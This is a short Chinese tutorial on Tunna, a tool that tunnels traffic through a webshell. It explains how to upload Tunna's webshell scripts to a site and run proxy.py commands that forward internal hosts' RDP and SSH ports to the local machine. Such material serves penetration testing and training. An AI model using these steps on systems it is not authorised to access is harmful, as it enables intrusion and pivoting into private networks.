# Tunna 实现内网穿透

### Github地址

```
https://github.com/SECFORCE/Tunna

```

### 注：Tunna是python2环境

下载到本地之后在webshells目录里有三种格式的脚本如下图

![](images/15897829912132.png)


将对应格式的脚本文件传到网站目录中

然后本地执行

```
python proxy.py -u http://192.168.0.1/conn.php -l 6666 -r 3389 -v

```

如上命令是将内网主机的3389端口转发到本地的6666端口上

本地直接用mstsc链接127.0.0.1：6666即可

```
python proxy.py -u http://192.168.0.1/conn.php -l 6666 -a 172.0.0.2 -r 3389

```

如上命令是将内网其他主机的3389端口转发到本地的6666端口上

```
python proxy.py -u http://172.0.0.1/conn.php -l 1234 -r 22 -v -s

```

## 如上命令，加上-s参数是为了避免连接ssh中断

还有MSF利用tunna转发的方式，这里不做介绍了

